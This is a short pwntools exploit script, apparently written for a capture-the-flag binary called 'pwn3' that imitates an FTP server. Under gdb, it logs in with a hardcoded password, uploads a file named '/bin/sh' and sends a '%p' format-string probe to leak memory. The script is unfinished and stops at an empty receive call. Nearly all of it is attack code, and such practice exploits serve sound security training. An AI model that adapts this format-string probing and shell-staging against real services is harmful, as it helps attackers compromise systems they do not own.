from pwn import*
context.update(arch='i386',os='linux')
context.log_level='debug'
context.terminal = ["qterminal", "-e"]



p=process('./pwn3')
gdb.attach(p,'b* 0x080486a3')
sleep(2)
p.recvuntil('m):')
p.sendline('rxraclhm')

p.recvuntil('ftp>')
p.sendline('put')
p.recvuntil('upload:')
p.sendline('/bin/sh\x00')
sleep(0.2)
p.sendline('%p')
p.recvuntil('ftp>')
p.sendline('get')
p.recvuntil('')